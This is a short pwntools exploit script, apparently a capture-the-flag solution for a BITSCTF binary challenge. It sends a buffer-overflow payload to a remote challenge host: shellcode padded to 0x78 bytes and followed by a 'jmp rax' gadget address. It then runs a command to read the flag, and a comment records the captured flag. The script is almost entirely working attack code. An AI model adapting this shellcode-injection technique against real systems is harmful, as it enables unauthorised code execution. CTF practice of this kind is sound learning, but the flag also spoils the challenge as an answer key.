#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./main", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chals.bitskrieg.in", 6001)

JMP_RAX = 0x4010ac # : jmp rax

payload = asm(shellcraft.sh()).ljust(0x78, b"A")
payload += p64(JMP_RAX)
p.sendline(payload)

p.sendline(b"/bin/cat flag.txt")

# BITSCTF{w3lc0m3_70_7h3_w0rld_0f_b1n4ry_3xpl01t4t10n_ec5d9205}
print(p.readuntil(b"}").decode())
